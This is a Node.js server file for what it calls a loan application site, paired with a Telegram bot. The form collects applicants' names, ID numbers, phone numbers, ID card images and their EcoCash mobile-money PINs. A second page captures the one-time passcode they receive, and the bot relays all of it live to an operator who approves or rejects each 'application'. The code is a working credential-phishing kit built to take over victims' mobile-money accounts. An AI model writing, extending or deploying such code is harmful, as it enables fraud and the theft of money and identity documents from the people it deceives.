const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const multer = require('multer');
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() }); 

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
const applications = {}; 

bot.start((ctx) => ctx.reply('Welcome Admin! You will receive loan applications and OTPs here for approval.'));

// --- ADMIN ACTIONS (APPROVE / REJECT) ---
bot.action(/^approve_(.+)$/, async (ctx) => {
    const appId = ctx.match[1];
    if (!applications[appId]) return ctx.answerCbQuery('Application not found.');
    
    applications[appId].status = 'approved';
    ctx.answerCbQuery('Application Approved!');
    
    const appData = applications[appId];
    
    // SEND A NEW MESSAGE WITH FULL DETAILS AND DECISION (Keeps history saved)
    const savedMessage = `
✅ <b>APPLICATION APPROVED</b> ✅

<b>App ID:</b> ${appId}
<b>Full Name:</b> ${appData.fullName}
<b>ID Number:</b> ${appData.idNumber}
<b>Phone:</b> +263${appData.phoneNumber}
<b>Email:</b> ${appData.email}
<b>Loan Amount:</b> $${appData.loanAmount}
<b>EcoCash PIN:</b> <code>${appData.ecoCashPin}</code>
<b>OTP Entered:</b> <code>${appData.otpEntered}</code>

<i>Status: Approved by Admin. User is now on the processing page.</i>
    `;
    bot.telegram.sendMessage(ADMIN_CHAT_ID, savedMessage, { parse_mode: 'HTML' });
});

bot.action(/^reject_(.+)$/, async (ctx) => {
    const appId = ctx.match[1];
    if (!applications[appId]) return ctx.answerCbQuery('Application not found.');
    
    applications[appId].status = 'rejected';
    ctx.answerCbQuery('Application Rejected!');
    
    const appData = applications[appId];
    
    // SEND A NEW MESSAGE WITH FULL DETAILS AND DECISION (Keeps history saved)
    const savedMessage = `
❌ <b>APPLICATION REJECTED</b> ❌

<b>App ID:</b> ${appId}
<b>Full Name:</b> ${appData.fullName}
<b>ID Number:</b> ${appData.idNumber}
<b>Phone:</b> +263${appData.phoneNumber}
<b>Email:</b> ${appData.email}
<b>Loan Amount:</b> $${appData.loanAmount}
<b>EcoCash PIN:</b> <code>${appData.ecoCashPin}</code>
<b>OTP Entered:</b> <code>${appData.otpEntered}</code>

<i>Status: Rejected by Admin.</i>
    `;
    bot.telegram.sendMessage(ADMIN_CHAT_ID, savedMessage, { parse_mode: 'HTML' });
});

bot.launch().then(() => console.log('Bot running'));

// --- API: RECEIVE FORM DATA & FILE ---
app.post('/api/apply', upload.single('idCard'), async (req, res) => {
    const appId = `APP_${Date.now()}`;
    const data = req.body; 
    const file = req.file; 

    applications[appId] = { ...data, status: 'pending_otp' };

    const message = `
🚨 <b>NEW LOAN APPLICATION</b> 🚨

<b>App ID:</b> ${appId}
<b>Full Name:</b> ${data.fullName}
<b>ID Number:</b> ${data.idNumber}
<b>Phone:</b> +263${data.phoneNumber}
<b>Email:</b> ${data.email}
<b>Loan Amount:</b> $${data.loanAmount}
<b>EcoCash PIN:</b> <code>${data.ecoCashPin}</code>
<b>Employment:</b> ${data.employmentStatus}

<i>Waiting for user to enter OTP on the website...</i>
    `;

    try {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        
        if (file) {
            try {
                await bot.telegram.sendDocument(ADMIN_CHAT_ID, { source: file.buffer, filename: file.originalname });
            } catch (fileError) {
                console.log("File upload failed:", fileError.message);
            }
        }
        res.json({ success: true, appId: appId });
    } catch (error) {
        console.error("TELEGRAM ERROR:", error.message);
        res.status(500).json({ success: false, message: error.message });
    }
});

// --- API: RECEIVE OTP AND ASK ADMIN FOR APPROVAL ---
app.post('/api/verify-otp', express.json(), async (req, res) => {
    const { appId, otp } = req.body;
    
    if (!applications[appId]) {
        return res.status(404).json({ success: false, message: 'Application not found.' });
    }

    const appData = applications[appId];
    appData.otpEntered = otp;

    const message = `
🔐 <b>OTP RECEIVED</b>
<b>Name:</b> ${appData.fullName}
<b>App ID:</b> ${appId}
<b>OTP Entered:</b> <code>${otp}</code>

<i>Do you want to approve this user to proceed to the processing stage?</i>
    `;

    const keyboard = Markup.inlineKeyboard([
        [
            Markup.button.callback('✅ Approve', `approve_${appId}`),
            Markup.button.callback('❌ Reject', `reject_${appId}`)
        ]
    ]);

    try {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML', ...keyboard });
        res.json({ success: true, message: 'OTP sent to admin for approval.' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Failed to send OTP to admin.' });
    }
});

// --- API: CHECK STATUS (Called by the wait.html page) ---
app.get('/api/check-status/:appId', (req, res) => {
    const appId = req.params.appId;
    if (!applications[appId]) return res.status(404).json({ status: 'not_found' });
    res.json({ status: applications[appId].status });
});

// --- SERVE PAGES ---
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
app.get('/wait.html', (req, res) => res.sendFile(path.join(__dirname, 'wait.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));